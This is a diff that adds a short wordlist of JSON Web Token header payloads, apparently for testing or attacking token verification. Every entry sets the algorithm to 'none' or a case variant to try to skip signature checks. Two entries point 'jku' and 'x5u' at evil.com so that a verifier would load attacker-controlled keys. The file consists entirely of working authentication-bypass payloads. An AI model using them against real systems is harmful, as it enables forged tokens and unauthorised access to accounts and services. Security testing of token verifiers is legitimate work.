@@ -1,0 +1,10 @@
+{"alg":"none"}
+{"alg":"None"}
+{"alg":"NONE"}
+{"alg":"none","typ":"JWT"}
+{"alg":"none","kid":"test"}
+{"alg":"none","cty":"JWT"}
+{"alg":"none","crit":[]}
+{"alg":"none","jku":"https://evil.com/jwks.json"}
+{"alg":"none","x5u":"https://evil.com/cert.pem"}
+{"alg":"none","typ":"JWT","kid":"bypass"}
